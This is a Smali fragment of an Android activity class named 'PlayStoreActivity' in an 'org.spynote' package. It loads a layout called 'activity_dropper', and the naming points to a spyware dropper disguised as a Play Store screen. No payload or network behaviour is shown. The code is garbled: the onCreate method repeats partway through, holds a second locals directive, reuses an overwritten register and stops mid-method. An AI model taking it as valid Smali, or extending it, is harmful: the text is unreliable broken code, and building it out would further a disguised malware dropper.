.class public Lorg/spynote/PlayStoreActivity;
.super Landroid/app/Activity;
.source "PlayStoreActivity.java"


.method public constructor <init>()V
    .locals 0
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V
    return-void
.end method


.method protected onCreate(Landroid/os/Bundle;)V
    .locals 2

    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    invoke-virtual {p0}, Lorg/spynote/PlayStoreActivity;->getResources()Landroid/content/res/Resources;
    move-result-object v0
    const-string v1, "activity_dropper"
    const-string p1, "layout"
    invoke-virtual {p0}, Lorg/spynote/PlayStoreActivity;->getPackageName()Ljava/lang/String;
    move-result-object p0
    invoke-virtual {v0, v1, p1, p0}, Landroid/content/res/Resources;->getIdentifier(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I
    move-result v0
    if-lez v0, :skip_layout
    .locals 3



    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V



    invoke-virtual {p0}, Lorg/spynote/PlayStoreActivity;->getResources()Landroid/content/res/Resources;

    move-result-object v0

    const-string v1, "activity_dropper"

    const-string v2, "layout"

    invoke-virtual {p0}, Lorg/spynote/PlayStoreActivity;->getPackageName()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v0, v1, v2, p1}, Landroid/content/res/Resources;->getIdentifier(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I